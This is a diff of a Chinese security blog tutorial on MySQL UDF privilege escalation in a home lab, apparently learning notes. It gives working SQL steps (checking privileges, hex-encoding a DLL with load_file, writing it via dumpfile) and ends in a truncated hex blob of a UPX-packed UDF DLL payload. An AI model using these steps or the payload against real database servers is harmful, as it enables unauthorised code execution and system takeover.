-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E7%B3%BB%E5%88%97/">
-                                <span class="chip bg-color">数据库提权系列</span>
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                内网渗透
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-09-25
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-09-25
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.8k
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
-                </div>
-                
-
-                
-            </div>
-        </div>
-        <hr class="clearfix">
-
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>权限提升学习</span></h1>
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.css">
-        
-
-        
-
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h1>0x01 前言</h1>
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content slide-up"><h1 id="0x01-前言">0x01 前言</h1>
 <p>本文的来源主要是上一次刷vulnhub靶场所遗留的问题，本着哪里不懂学哪里的精神而撰写的本文，这次主要学习一下MySQL udf提权以及如何逃逸restricted shell（受限制的shell，也称lshell）。</p>
 <p>最后会浅浅学习一下内网渗透时的一些常用工具的命令学习，废话不多说，直接开卷！！！</p>
-<h1>0x02 MySQL-udf 提权</h1>
-<h2 id="2-1-简介">2.1 简介</h2>
+<h1 id="0x02-mysql-udf-提权">0x02 MySQL-udf 提权</h1>
+<h2 id="21-简介">2.1 简介</h2>
 <p>UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。</p>
 <p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。</p>
-<h2 id="2-2-利用条件">2.2 利用条件</h2>
-<pre class="line-numbers language-none"><code class="language-none">1. 将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）
+<h2 id="22-利用条件">2.2 利用条件</h2>
+<pre><code class="hljs plaintext">1. 将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）
 2. 从udf文件中引入自定义函数(user defined function)
-3. 执行自定义函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+3. 执行自定义函数</code></pre>
 <p><strong>mysql用户权限问题</strong></p>
 <p>获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。</p>
 <p>拥有将udf.dll写入相应目录的权限。</p>
@@ -480,10 +172,10 @@
 </tbody>
 </table>
 <p>一般Lib、Plugin文件夹需要手工建立（可用<strong>NTFS ADS</strong>流模式突破进而创建文件夹）不过这种方法暂未见过。</p>
-<h3 id="2-2-1-常规情况：">2.2.1 常规情况：</h3>
-<pre class="line-numbers language-none"><code class="language-none">1. mysql配置文件secure_file_priv项设置为空，（如果为NULL或/tmp/等指定目录，即无法自定义udf文件导出位置，则无法利用）；
+<h3 id="221-常规情况">2.2.1 常规情况：</h3>
+<pre><code class="hljs plaintext">1. mysql配置文件secure_file_priv项设置为空，（如果为NULL或/tmp/等指定目录，即无法自定义udf文件导出位置，则无法利用）；
 
-2. CREATE权限、FILE权限（root用户默认拥有所有权限）。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+2. CREATE权限、FILE权限（root用户默认拥有所有权限）。</code></pre>
 <p>首先基础语法查询是否 secure_file_priv 没有限制</p>
 <table>
 <thead>
@@ -511,95 +203,95 @@
 <p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
 <p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
 </blockquote>
-<h3 id="2-2-2-特殊情况：">2.2.2 特殊情况：</h3>
+<h3 id="222-特殊情况">2.2.2 特殊情况：</h3>
 <p>INSERT权限；</p>
 <p>UPDATE权限；</p>
 <p>DELETE权限。</p>
-<h4 id="查看当前数据库用户权限：">查看当前数据库用户权限：</h4>
+<h4 id="查看当前数据库用户权限">查看当前数据库用户权限：</h4>
 <p>我们进入mysql所在的bin目录下打开cmd输入账号密码登录数据库</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from mysql.user where user = substring_index(user(), '@', 1)\G;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925193740072.png" alt="image-20230925193740072"></p>
+<pre><code class="hljs mysql">select * from mysql.user where user = substring_index(user(), '@', 1)\G;</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925193740072.png" alt="image-20230925193740072"></p>
 <p>可以看到当前用户的权限情况，Y代表有对应的权限</p>
-<h2 id="2-3-版本特性">2.3 版本特性</h2>
+<h2 id="23-版本特性">2.3 版本特性</h2>
 <p>udf提权操作中的一个步骤是将我们的udf文件上传到mysql的检索目录中，Windows系统下mysql各版本的检索目录有所不同：</p>
-<h3 id="1、-Mysql-5-0">1、 Mysql &lt; 5.0</h3>
+<h3 id="1-mysql-lt-50">1、 Mysql &lt; 5.0</h3>
 <p>导出路径随意。</p>
-<h3 id="2、-5-0-Mysql-5-1">2、 5.0 &lt;= Mysql &lt; 5.1</h3>
+<h3 id="2-50-lt-mysql-lt-51">2、 5.0 &lt;= Mysql &lt; 5.1</h3>
 <p>Win2000导出路径： C:/Winnt/udf.dll</p>
 <p>其他Windows系统导出路径均为：C:/Windows/udf.dll或C:/Windows/system32/udf.dll</p>
-<h3 id="3、-Mysql-5-1">3、 Mysql &gt;= 5.1</h3>
+<h3 id="3-mysql-gt-51">3、 Mysql &gt;= 5.1</h3>
 <p>Mysql安装目录的lib\plugin文件夹下，如果mysql安装时不选择完整安装或使用集成开发环境等情况下lib\plugin目录大概率是不存在的，需要自行创建。</p>
 <p>由于这里还得搭配环境，我这里选择在虚拟机上下载小皮（自带mysql）</p>
-<p><img src="image-20230925195617350.png" alt="image-20230925195617350"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925195617350.png" alt="image-20230925195617350"></p>
 <p>搭建成功！</p>
-<h2 id="2-4-UDF文件位置">2.4 UDF文件位置</h2>
-<h3 id="1、sqlmap：">1、sqlmap：</h3>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap\data\udf\mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925195858624.png" alt="image-20230925195858624"></p>
-<h3 id="2、metaspliot：">2、metaspliot：</h3>
-<pre class="line-numbers language-none"><code class="language-none">/usr/share/metasploit-framework/data/exploits/mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925200105640.png" alt="image-20230925200105640"></p>
-<h2 id="2-5-操作步骤">2.5 操作步骤</h2>
-<h3 id="1、查看可导出文件位置">1、查看可导出文件位置</h3>
-<p><img src="image-20230925200241394.png" alt="image-20230925200241394"></p>
+<h2 id="24-udf文件位置">2.4 UDF文件位置</h2>
+<h3 id="1-sqlmap">1、sqlmap：</h3>
+<pre><code class="hljs plaintext">sqlmap\data\udf\mysql</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925195858624.png" alt="image-20230925195858624"></p>
+<h3 id="2-metaspliot">2、metaspliot：</h3>
+<pre><code class="hljs plaintext">/usr/share/metasploit-framework/data/exploits/mysql</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925200105640.png" alt="image-20230925200105640"></p>
+<h2 id="25-操作步骤">2.5 操作步骤</h2>
+<h3 id="1-查看可导出文件位置">1、查看可导出文件位置</h3>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925200241394.png" alt="image-20230925200241394"></p>
 <p>这里看到我是NULL很明显不能利用了，因此我跟着网上文章改了一下配置为空，方便接下来操作</p>
-<p><img src="image-20230925201457620.png" alt="image-20230925201457620"></p>
-<h3 id="2、查看当前数据库用户权限">2、查看当前数据库用户权限</h3>
-<pre class="line-numbers language-none"><code class="language-none">select * from mysql.user where user = substring_index(user(), '@', 1)\G;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925201457620.png" alt="image-20230925201457620"></p>
+<h3 id="2-查看当前数据库用户权限">2、查看当前数据库用户权限</h3>
+<pre><code class="hljs plaintext">select * from mysql.user where user = substring_index(user(), '@', 1)\G;</code></pre>
 <p>可以看到有几个关键的权限</p>
-<pre class="line-numbers language-none"><code class="language-none">Select_priv: Y
+<pre><code class="hljs plaintext">Select_priv: Y
 Insert_priv: Y
 Update_priv: Y
-Delete_priv: Y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="3、确认mysql安装位置">3、确认mysql安装位置</h3>
-<p><img src="image-20230925201646050.png" alt="image-20230925201646050"></p>
-<p><img src="image-20230925201736284.png" alt="image-20230925201736284"></p>
-<h3 id="4、通过主机版本及架构确认mysql位数来选用udf文件">4、通过主机版本及架构确认mysql位数来选用udf文件</h3>
+Delete_priv: Y</code></pre>
+<h3 id="3-确认mysql安装位置">3、确认mysql安装位置</h3>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925201646050.png" alt="image-20230925201646050"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925201736284.png" alt="image-20230925201736284"></p>
+<h3 id="4-通过主机版本及架构确认mysql位数来选用udf文件">4、通过主机版本及架构确认mysql位数来选用udf文件</h3>
 <p>此处显示为Windows 64位操作系统</p>
-<pre class="line-numbers language-none"><code class="language-none">show variables like '%compile%';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925201847107.png" alt="image-20230925201847107"></p>
-<h3 id="5、查看数据库版本，判断udf文件写入位置">5、查看数据库版本，判断udf文件写入位置</h3>
-<p><img src="image-20230925201939661.png" alt="image-20230925201939661"></p>
-<h4 id="5-1-mysql大于5-1版本时">5.1 mysql大于5.1版本时</h4>
+<pre><code class="hljs plaintext">show variables like '%compile%';</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925201847107.png" alt="image-20230925201847107"></p>
+<h3 id="5-查看数据库版本判断udf文件写入位置">5、查看数据库版本，判断udf文件写入位置</h3>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925201939661.png" alt="image-20230925201939661"></p>
+<h4 id="51-mysql大于51版本时">5.1 mysql大于5.1版本时</h4>
 <p><strong>查看 plugin 目录，存在lib\plugin目录且有webshell时，直接上传udf文件。</strong></p>
-<p><img src="image-20230925202112099.png" alt="image-20230925202112099"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925202112099.png" alt="image-20230925202112099"></p>
 <p><strong>查看 plugin 目录，存在lib\plugin目录但没有webshell时，则需要以16进制编码写入udf文件。</strong></p>
 <p>很明显我们这里的情况是后者</p>
-<h5 id="5-1-2-sqlmap-udf文件解码">5.1.2 sqlmap udf文件解码</h5>
+<h5 id="512-sqlmap-udf文件解码">5.1.2 sqlmap udf文件解码</h5>
 <p>​		首先将对应版本的udf文件进行16进制编码（sqlmap中的udf文件为防止误杀默认是经过异或编码的，需先使用sqlmap自带的脚本解码）。</p>
-<pre class="line-numbers language-none"><code class="language-none">python3 extra/cloak/cloak.py -d -i data/udf/mysql/windows/64/lib_mysqludf_sys.dll_<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925202546055.png" alt="image-20230925202546055"></p>
-<p><img src="image-20230925202705267.png" alt="image-20230925202705267"></p>
-<h5 id="5-1-3-16进制编码udf文件">5.1.3 16进制编码udf文件</h5>
-<pre class="line-numbers language-none"><code class="language-none">select hex(load_file('C:\\lib_mysqludf_sys.dll')) into dumpfile 'C:\\lib_mysqludf_sys.txt';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925203656117.png" alt="image-20230925203656117"></p>
-<p><img src="image-20230925203714767.png" alt="image-20230925203714767"></p>
-<h5 id="5-1-4-udf写入plugin目录">5.1.4 udf写入plugin目录</h5>
+<pre><code class="hljs plaintext">python3 extra/cloak/cloak.py -d -i data/udf/mysql/windows/64/lib_mysqludf_sys.dll_</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925202546055.png" alt="image-20230925202546055"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925202705267.png" alt="image-20230925202705267"></p>
+<h5 id="513-16进制编码udf文件">5.1.3 16进制编码udf文件</h5>
+<pre><code class="hljs plaintext">select hex(load_file('C:\\lib_mysqludf_sys.dll')) into dumpfile 'C:\\lib_mysqludf_sys.txt';</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925203656117.png" alt="image-20230925203656117"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925203714767.png" alt="image-20230925203714767"></p>
+<h5 id="514-udf写入plugin目录">5.1.4 udf写入plugin目录</h5>
 <p>将16进制编码后udf文件使用dumpfile函数写入磁盘（outfile导出文件会在末尾写入新行且转义换行符，破坏二进制文件结构，dumpfile不会进行任何操作）。</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07</span>
